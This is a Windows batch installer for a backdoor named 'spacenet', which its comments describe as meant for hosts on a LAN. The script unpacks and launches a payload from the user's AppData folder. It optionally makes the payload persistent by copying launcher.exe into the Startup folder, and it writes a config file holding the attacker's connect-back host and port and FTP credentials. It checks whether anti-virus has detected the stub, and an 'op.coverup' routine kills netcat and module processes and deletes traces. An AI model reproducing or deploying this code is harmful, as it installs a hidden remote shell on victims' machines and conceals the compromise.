@echo on
set arg1=%1
set error=0
set rootdir=%appdata%
call insconfig.bat
mkdir unpack
set target=%randex%.zip
echo [+] target: %randex%...
:: powershell Expand-Archive -path %target% -DestinationPath unpack
cscript /b unpack.vbs "%cd%\%target%" "%cd%\unpack"
ping localhost -n 4 >nul

:: override variable declaration...
:: enter time and date so attacker can identify the host(s)...
:: The machine name can also be used but because this
:: backdoor was meant to be used to a LAN with multiple
:: hosts with the same names, and thus time and date seems more
:: effective...

	echo { >>%logdump%
	echo [+] time stamp: %time% >>%logdump%
	echo [+] date stamp: %date% >>%logdump%
	echo [+] loading... >>%logdump%
	echo [+] checking if spcnt is installed...>>%logdump%
	
	:: checking if spacenet is already installed...
	:: To check if spacenet is installed so the program can enter a routine to check if
	:: the version is outdated or if it is a more recent version
	
if EXIST "%rootdir%\build.bat" (
	:: print spacenet is already installed...
	:: if installed check the build version...
		echo    [-] spcnt is already installed... >>%logdump%
		echo [+] checking version... >>%logdump%
		call %rootdir%\build.bat
		set insver=%ver%
		:: a label wasn't used because this method makes the code
		:: easier to trace...
		IF "%insver%" gtr "%buildver%" (
			echo [+] installation aborted...
			echo [!] reason: the pending version is outdated...
			set /a "error = %error% + 1"
			goto incomplete
			)
		IF "%insver%" lss "%buildver%" goto install
	goto sameabort
	)
	
	:install
	echo [+] pending version is more recent... >>%logdump%
:: checking if the user wants to unintall spacenet...

:: load line by line variables from tmp.txt
:: To load the variables saved to tmp.txt by the hta gui
:: into the batch script...
	echo [+] getting payload preset details... >>%logdump%
:loadtmp
:: initilise eos reporting
:: eos reporting is setup so that the program will count
:: the number of errors encountered. and dump it out to
:: %logdump%

:: check if %insdir% exists, if it does not exist make directory
:: this is meant for first time installtions or when the backdoor
:: is erased for some reason... ie. anti-virus detction...
if NOT EXIST "%insdir%" goto mkdir

:return
:: check if the payload exists and is ready...
:: re-call insconfig to ensure minimal error encounter...
call insconfig.bat
if EXIST "%payloads%\%buildver%.exe" goto checkok
	echo    [-] cannot copy payload... >>%logdump%
	echo    [-] cannot duplicate payload...
	echo    [-] payload missing... >>%logdump%
	echo    [-] payload missing...
	set /a "error= %error% + 1"
goto incomplete



:: mkdir %insdir% to make the directories before the installation process...
:mkdir
	echo    [-] %insdir% is missing... >>%logdump%
	echo    [-] installation direcory is missing...
	set /a "error= %error% + 1"
	echo [+] making directory %insdir%... >>%logdump%
	echo [+] making directory... 
mkdir %insdir%
goto return

:: continuation of the installation process...
:checkok
	copy %payloads%\%buildver%.exe %insdir%
		
		
:: sub-routine...
:: to correctly execute %buildver%.exe in the correct directory...
:: sometimes the module package executable gets installed in the
:: wrong direcory...
		set realdir=%cd%
		cd /D %insdir%
		start %buildver%.exe
		ping localhost -n 2 >nul
		cd /D %realdir%
		
:: checking if this installer is required to install a persistant or
:: temporary shell...
		echo [+] checking shell type requirements... >>%logdump%
		IF "%shellt%"=="perm" goto jumpo
		goto skipl
		:jumpo
		echo [+] persistant shell is needed... >>%logdump%	
		echo [+] deleting launcher if it already exists.. >>%logdump%
:: a persistant shell is needed!! So installing the launcher in the
:: startup directory...
		cd /D %insdir%
		set stdir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
		if exist "%stdir%\launcher.exe" (
			del "%stdir%\launcher.exe"
			echo [+] deleting launcher if it already exists.. >>%logdump%
		)
		copy "launcher.exe" "%stdir%"
		cd /D %realdir%
		
:: checking if persistant launcher is installed...
:: This routine is actually meant to be executed if the 
:: backdoor is being updated. However just to be sure the 
:: the sub script still exists...
	if EXIST "%stdir%launcher.exe" goto stdirok
	echo    [-] launcher could not be copied...  >>%logdump%
	echo    [-] cannot copy make payload persistant...
	echo [+] retrying... >>%logdump%
	set /a "error= %error% + 1"
	echo [+] retrying...

:: retrying copying
:: subroutine to copy the launcher to the startup folder incase the first attempt
:: has failed... This routine is important because its job is to make sure the backdoor
:: stays persistant...
		set realdir=%cd%
		set stdir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
		cd /D %insdir%
		copy /Y "launcher.exe" "%USERPROFILE%\Start Menu\Programs\Startup"
		cd /D %realdir%
	if EXIST "%stdir%launcher.exe" echo [+] copying successful... >>%logdump% && goto stdirok
	echo    [-] retcopy init has also failed >>%logdump%
	echo    [-] re-copy has also failed...
	set /a "error= %error% + 1"
	echo [!] warning... >>%logdump%
	echo    [-] warning : cannot move launcher to startup directory...
	echo [!] payload is not persistant!... >>%logdump%
	:stdirok	
	
:: a temporary installation is needed!! so the installer will print out
:: so and also print out a status code STE365 which will be highlighted
:: when the debug is analysed by the attacker later on after the attack has been completed...
	:skipl
	echo [+] temporary shell is needed... >>%logdump%
	echo [+] status code STE365... >>%logdump%
	echo [+] skipping launcher installation... >>%logdump%
	
:: writing config files...
:: writing configuration files for the backdoor so the backdoor can know which
:: host and which port to connect to... The backdoor will 'call' the config file
:: to import the configuration as variables
	if NOT EXIST "%insdir%\config.bat" goto missingconf
	:missingconfret
		:: copy the config file from the temp dir to insdir...
	echo [+] configuration written... >>%logdump%

:: re-writing the build file to enable future updates or over-written installations
:: this file has 1 purpose: to provide the launcher with the current build number so
:: it can change its directory trough that specific directory to execute module.exe
	del "%rootdir%\build.bat"
	echo set ver=%buildver%>>%rootdir%\build.bat
	echo set location=%rootdir%>>%rootdir%\build.bat
goto complete


:: re-write the config file in case the config is corrupted...
:: sometimes the config file gets corrupted during updates and so the porgram will
:: occasionally have to update the config file to start the module and other components
:missingconf
	echo    [-] config file is missing... >>%logdump%
	echo [+] writing a config file... >>%logdump%
	set /a "error= %error% + 1"
		:: main configuration
		echo set uniconf=connectionconfig.bat >>%insdir%\config.bat
		echo set waitime=5 >>%insdir%\config.bat
		echo set ver=%buildver% >>%insdir%\config.bat
		echo set rootdir=%rootdir% >>%insdir%\config.bat
		echo set buildversion=%buildver% >>%insdir%\config.bat
		echo set lport=%lport% >>%insdir%\config.bat
		echo set lhost=%lhost% >>%insdir%\config.bat
		echo set prog=%prog% >>%insdir%\config.bat
		echo set ftpuser=%ftpuser%>>%insdir%\config.bat
		echo set ftppass=%ftppass%>>%insdir%\config.bat
		echo set uhost=%uhost%>>%insdir%\config.bat
		echo set uport=%uport%>>%insdir%\config.bat
		
		
	echo [+] finished writing config file... >>%logdump%
goto missingconfret
	
:: the pending version of the shell is more recent so install it...

 
:: print error if the pending version is outdated...
:: this error is not technically an error because the the build is more
:: recent

:sameabort
	echo [+] the same version is installed...
goto incomplete

:: Print error if the pending version is same as installed version...
:: in some cases the attacker can become retarded ( like myself on multiple
:: occasions ) and install the same version of spacenet on the same computer
:: , so in such cases the program will fail to compenstate for such an error
:: it will be like giving the same set of numbers for a program that compairs
:: and check which number is the highest
	echo    [-] the same version of spacenet is already installed... >>%logdum
set /a "error= %error% + 1"   
	echo [+] the same version of spacenet is already installed...
	echo [+] aborting installation...
goto incomplete

:: error debug for error ERR001
:blankpreset
	echo    [-] blank tmp.txt file... >>%logdump%
if "%Line_2%"==""    [-] lport value also missing... >>%logdump%
set /a "error= %error% + 1"
goto incomplete

:: indicate that the installation failed and is aborted...
:: this is the end for the installation process and end of the
:: relevent string for the debug file...
:incomplete
	echo [+] installation aborted... >>%logdump%
	echo [+] routine complete with %error% errors... >>%logdump%
goto fatalerror

::anti-virus has detected the stub...
:                         avraid
	echo [+] warning the stub has been detected... >>%logdump%
	echo [+] mission failed... >>%logdump%
	goto fatalerror

:: indicate that the installation process in complete...
:: to show the installation process has successfully completed and
:: the end of the debug file...
:complete
	echo [+] installation complete... >>%logdump%
	echo [+] starting module.exe... >>%logdump%
	echo [+] executing module...
	ping localhost -n 2 >nul
	IF NOT EXIST "%insdir%\module.exe" goto avraid
	echo [+] routine complete with %error% errors... >>%logdump%
ping localhost -n 2 >nul
		:: sub-routine...
		:: to correctly execute module.exe in the correct directory...
		:: to start the module in the destination directory rather than
		:: the current installer directory
		set realdir=%cd%
		cd /D %insdir%
		start module.exe
		cd /D %realdir%
goto eof

:: subroutine to unintall spacenet from current host...
:: this is a one label statement to uninstall spacenet from the current
:: current computer and try to delete any evidence of spacenet ever existing
:: on this computer...

:: WARNING...
:: ----------
:: Work in progress... this label really deifies the original purpose of this
:: batch file...
:uninstall
call insconfig.bat
:: checking if spacenet is installed...
	IF NOT EXIST "%rootdir%\build.bat" goto buildmissing
	IF NOT EXIST "%rootdir%\%buildver%" goto directorymissing
	color 0c
	echo [+] deleting spacenet from this PC...
	ping localhost -n 3 >nul
	echo [!] op.coverup! >>%logdump%
	echo [!] Time stamp: %time% >>%logdump%
	echo [!] Date stamp: %date% >>%logdump%
	echo [!] warning... >>%logdump%
	echo [+] deleting all components...
	ping localhost -n 3 >nul
	
:: make delay...
	echo [!] subroutine unintallall invoked... >>%logdump%
	echo [!] running routine... >>%logdump%
	echo [+] deleting guide file... >>%logdump%
	echo [+] deleting guide file...
	ping localhost -n 3 >nul
	
:: delete the guide file...
	del %rootdir%\build.bat
	echo [+] killing spacenet related processes... >>%logdump%
	echo [+] killing all processes...
	ping localhost -n 3 >nul

:: kill all the modules...
	echo [-] kill module.exe... >>%logdump%
	taskkill /f /t /im "module.exe" >nul
	echo [-] kill nc.exe... >>%logdump%
	
:: the following next 2 processes are not executed always
:: so the process has to be checked for its existence before
:: the attempt to terminate the program...
	tasklist /fi "imagename eq nc.exe" |find ":" > nul
	if errorlevel 1 taskkill /f /im "nc.exe"
	echo [+] killing launcher.exe...
	tasklist /fi "imagename eq launcher.exe" |find ":" > nul
	if errorlevel 1 taskkill /f /im "launcher.exe"
	ping localhost -n 4 >nul

:: delete the files and folders...
	echo [+] deleting files... >>%logdump%
	del /Q %rootdir%\%buildver%
	echo [+] deleting folder... >>%logdump%
	rmdir %rootdir%\%buildver%
	echo [+] deleting startup module...
	IF EXIST "%USERPROFILE%\Start Menu\Programs\Startup\launcher.exe" del /Q "%USERPROFILE%\Start Menu\Programs\Startup\launcher.exe"
	echo [!] finished deleting traces... >>%logdump% 
	color 0a
	echo [!] all components removed...
	ping localhost -n 3 >nul
	echo [+] all done...
	ping localhost -n 4 >nul
goto end
:eof
	if "%error%" geq "%errorlimit%" goto errorlimitexceed
	goto end
	
:: the error limit has exceeded and now will execute a message to
:: alert the attacker something is wrong and the debug has to analysed
:errorlimitexceed
	echo [!] warning error limit exceeded... >>%logsave%
	echo [!] please analyse the debug file... >>%logsave%
	set dump=%random%
	echo x=msgbox("Warning: error limit exceeded. %error% errors encounted. Analyse debug file.",0+6,"spacenet installer") >>%temp%\%dump%.vbs
	start %temp%\%dump%.vbs
goto end
:: a fatal error, from which cannot be recovered from has been encountered with...
:: display vbs script message
:fatalerror
	echo [!] warning a fatal error has been encountered with...
	echo [!] please analyse debug file...
	set dump=%random%
	echo x=msgbox("Warning: a fatal error has been encounted. Analyse debug file.",0+6,"spacenet installer") >>%temp%\%dump%.vbs
	start %temp%\%dump%.vbs
	echo [!] installation aborted... >>%logdump%
goto end
:: the build (guide) file is missing...
:: So cannot determine the folder directory...
:buildmissing
	set dump=%random%
	echo x=msgbox("Error: Build file is missing. Cannot locate the target.",0+6,"spacenet installer") >>%temp%\%dump%.vbs
	start %temp%\%dump%.vbs
	echo [!] installation aborted... >>%logdump%
goto end
:: the direcory itself is missing...
:: this is highly unusual. Because if it was detected by a AV the AV will not delete the folder...
:: this is most likely to be the work of a user...
:directorymissing
	set dump=%random%
	echo x=msgbox("Error: The direcory is missing. Probably deleted by the user.",0+6,"spacenet installer") >>%temp%\%dump%.vbs
	start %temp%\%dump%.vbs
	echo [!] installation aborted... >>%logdump%
goto end

:end
	echo } >>%logdump%
ping localhost -n 1 >nul
